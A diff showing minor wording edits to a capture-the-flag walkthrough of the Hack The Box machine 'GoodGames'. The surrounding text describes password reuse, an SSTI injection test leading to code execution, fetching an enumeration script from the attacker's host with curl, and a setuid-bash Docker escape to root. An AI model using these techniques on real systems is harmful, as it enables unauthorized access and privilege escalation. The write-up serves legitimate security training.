@@ -73,7 +73,7 @@ With the credentials `admin@goodgames.htb:superadministrator` I logged in.
 After clicking around I didn't find anything of value until I noticed the cog in the top right corner of the page. 
 Clicking the link took me to a page which failed to load, but allowed me to see another hostname to add to my /etc/hosts file `internal-administration.goodgames.htb`.
 
-I am taken to a login page and wonder if the administrator has re-used the same password.  
+I was taken to a login page and wondered if the administrator has re-used the same password.  
 
 [<img src="../images/good_games/internal_login.png"
   style="width: 800px;"/>](../images/good_games/internal_login.png)
@@ -93,7 +93,9 @@ As you can see after entering the payload
 
 \{\{7*7\}\}
 
-For the full name, upon saving this the templating engine has interpreted this as 49.  So we have a SSTI vulnerability we can exploit.  After heading over to [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection) which is a great resource and within the SSTI section I found some payloads which could potentially give us RCE or remote code execution. 
+for the full name, upon saving this the templating engine has interpreted this as 49.  So we have a SSTI vulnerability we can exploit.  
+
+After heading over to [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection) which is a great resource and within the SSTI section I found some payloads which could potentially give us RCE or remote code execution. 
 
 I used the payload 
 
@@ -149,7 +151,7 @@ I then downloaded and used a tool [deepce](https://github.com/stealthcopter/deep
 ```bash
 python3 -m http-server 8000
 ``` 
-and transferred it to the victim machine. 
+and transferred it to the victim machine by using curl on the victim machine.
 
 ```bash
 curl http://10.10.14.36:8000/deepce.sh
@@ -178,7 +180,7 @@ So I thought the easiest way to do this would be to copy the legitimate `/bin/ba
 
 `chown root:root bash`
 
-`chmod +s bash`
+`chmod +s ./bash`
 
 [<img src="../images/good_games/root_own_bash.png"
   style="width: 800px;"/>](../images/good_games/root_own_bash.png)
@@ -193,6 +195,8 @@ I then logged back into SSH with augustus and ran `./bash -p` to retain privileg
   
 From there I was able to access `/root/root.txt` for the system flag.  And that was the box.  
 
-I found the first part of the box really fun and got to exploit some common web vulnerabilities.  The privilege escalation path was not something I have had to do before (escape from a docker container) but was really fun and interesting and I have certainly learnt a few new tricks and technniques. 
+I found the first part of the box really fun and got to exploit some common web vulnerabilities.  
+
+The privilege escalation path was not something I have had to do before (escape from a docker container) but was really fun and interesting and I have certainly learnt a few new tricks and technniques. 
 
 Thank you to the creator TheCyberGeek for the machine.
